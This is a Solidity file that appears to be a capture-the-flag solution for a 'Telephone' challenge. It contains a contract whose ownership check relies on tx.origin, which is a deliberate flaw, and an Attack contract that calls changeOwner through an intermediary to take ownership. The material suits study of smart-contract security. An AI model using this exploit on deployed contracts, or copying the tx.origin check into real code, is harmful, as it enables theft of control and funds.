// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//Challenge :- Be the owner of the contract

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}





////////////////////////////////////////////////////////
/////////////////ATTACK/////////////////////////////////
////////////////////////////////////////////////////////
contract Attack{
    address telephone;

    constructor (address _tele) {
        telephone = _tele;
    }

    function captureContract() external  {
       (bool success,) = telephone.call(abi.encodeWithSignature("changeOwner(address)",msg.sender));
       require(success,"failed");
    }
}